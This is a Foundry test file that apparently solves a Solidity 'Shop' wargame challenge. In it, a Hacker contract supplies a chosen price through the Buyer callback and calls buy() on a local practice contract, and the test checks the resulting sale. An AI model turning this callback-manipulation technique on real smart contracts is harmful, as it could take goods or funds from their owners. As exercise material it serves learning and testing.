// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "src/Shop.sol";
import "forge-std/Test.sol";

contract ShopTest is Test {
    Shop private shop;
    Hacker private hacker;
    function setUp() external {
        shop = new Shop();
        hacker = new Hacker();
    }

    function testHack() external {
        hacker.setPrice(101);
        hacker.hack(address(shop));
        assertEq(shop.isSold(), true);
        assertEq(shop.price(), hacker._price());
    }
}

contract Hacker is Buyer {
    uint public _price;
    function price() external view returns (uint){
        return _price;
    }

    function setPrice(uint price_) external {
        _price = price_;
    }

    function hack(address victim) external {
        (bool success, ) = victim.call(abi.encodeWithSignature("buy()"));
        require(success, "tx failed");
    }
}